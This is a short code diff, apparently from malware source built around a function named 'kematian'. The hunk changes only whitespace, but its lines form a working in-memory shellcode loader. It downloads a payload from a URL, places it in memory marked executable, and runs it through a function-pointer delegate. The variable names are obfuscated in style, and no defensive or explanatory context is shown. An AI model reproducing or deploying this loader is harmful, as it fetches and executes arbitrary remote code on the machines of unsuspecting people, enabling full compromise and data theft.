@@ -17,9 +17,9 @@ function kematian {
                 golangshc = client.DownloadData(url);
             }
 
-            IntPtr chainski = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(golangshc.Length), 0x1000, 0x40);    
+            IntPtr chainski = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(golangshc.Length), 0x1000, 0x40);
             Marshal.Copy(golangshc, 0x0, chainski, golangshc.Length);
-            MemLoader kdot = Marshal.GetDelegateForFunctionPointer<MemLoader>(chainski);  
+            MemLoader kdot = Marshal.GetDelegateForFunctionPointer<MemLoader>(chainski);
             kdot();
         }
     }
